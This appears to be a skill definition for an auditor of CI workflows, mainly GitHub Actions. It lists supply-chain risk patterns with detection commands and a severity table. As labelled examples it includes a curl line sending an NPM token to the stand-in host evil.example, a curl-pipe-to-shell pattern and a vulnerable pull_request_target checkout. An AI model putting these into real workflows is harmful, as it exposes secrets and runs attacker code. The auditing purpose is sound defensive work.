---
name: agentic-actions-auditor
description: Audit GitHub Actions / GitLab CI / CircleCI / Azure Pipelines workflows shipped in target/. Flags the high-risk patterns that have caused real-world supply-chain compromises (pwnrequest, pull_request_target, unpinned actions, secret exfiltration, script-injection via PR title/body).
license: MIT (ZONOVA RESEARCH — coldvault.dev)
source_inspiration: trailofbits/skills/agentic-actions-auditor
---

# agentic-actions-auditor

## Scope

- `target/.github/workflows/**` (GitHub)
- `target/.gitlab-ci.yml`, `target/.gitlab/**`
- `target/.circleci/config.yml`
- `target/azure-pipelines.yml`, `target/.azure/**`
- `target/Jenkinsfile`
- Any `action.yml` / `action.yaml` (reusable actions defined by the repo)
- Dependabot / Renovate configs — they ship tokens

## GitHub Actions — the hit-list

### 1. `pull_request_target` with checkout of PR head

Classic "pwnrequest". Triggered by attacker-controlled PR but runs with the
**base** repo's secrets, and if it checks out the PR's head, it executes
attacker code against those secrets.

```yaml
on: pull_request_target          # 🚩
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # 🚩🚩 attacker code
      - run: npm ci && npm test   # ← runs on attacker code with SECRETS
```

### 2. Script injection via event inputs

`${{ github.event.issue.title }}` / `pull_request.title` / `comment.body` /
`head.ref` interpolated into `run:` — attacker controls the title, gets shell
execution.

```bash
grep -rnE '\$\{\{\s*github\.event\.(issue|pull_request|comment)' target/.github/workflows
```

### 3. Unpinned actions

```yaml
- uses: some-org/some-action@main   # 🚩 mutable ref
- uses: some-org/some-action@v1     # 🚩 tag can be re-pointed
```

Require SHA pinning. Enforce with:
```bash
grep -rnE "uses: [^#@]+@[a-zA-Z0-9._/-]+" target/.github/workflows | grep -v "@[a-f0-9]\{40\}"
```

### 4. Secret exfiltration into logs / artifacts

```yaml
run: echo "::set-output name=token::${{ secrets.NPM_TOKEN }}"    # deprecated + leaky
run: curl -X POST https://evil.example/?t=${{ secrets.NPM_TOKEN }}  # 🚩🚩
```

### 5. `GITHUB_TOKEN` permissions too broad

If `permissions:` is absent AND repo-default is "read/write", the token can
push, open PRs, etc. Recommend `permissions: contents: read` + widen per-job.

### 6. Third-party actions with network access at install

- `run: curl … | sh` — classic pipe-to-shell
- custom Docker actions that pull unpinned images

### 7. Self-hosted runner risk

Jobs tagged `runs-on: self-hosted` can reach the corp network. For a public
repo, this is extremely dangerous if PRs can trigger them.

## Tooling

```bash
# Semgrep has a curated GitHub Actions pack
semgrep --config p/github-actions --sarif \
    --output reports/ci-semgrep.sarif target/.github/ || true

# actionlint — lint/security for GitHub workflows
actionlint -format '{{json .}}' target/.github/workflows/*.yml \
    > reports/ci-actionlint.json 2>/dev/null || true

# zizmor (if installed) — dedicated GHA security linter
zizmor target/.github/workflows/ --format sarif \
    > reports/ci-zizmor.sarif 2>/dev/null || true
```

## Severity guide

| Pattern                                                   | Severity |
|-----------------------------------------------------------|----------|
| `pull_request_target` + checkout PR head + secret access  | CRITICAL |
| Script injection via event field                          | HIGH     |
| Unpinned action w/ secrets access                         | HIGH     |
| Secret echoed in `run:` or artifact                       | HIGH     |
| Broad `permissions: write-all` default                    | MEDIUM   |
| Unpinned action, no secrets                               | LOW      |
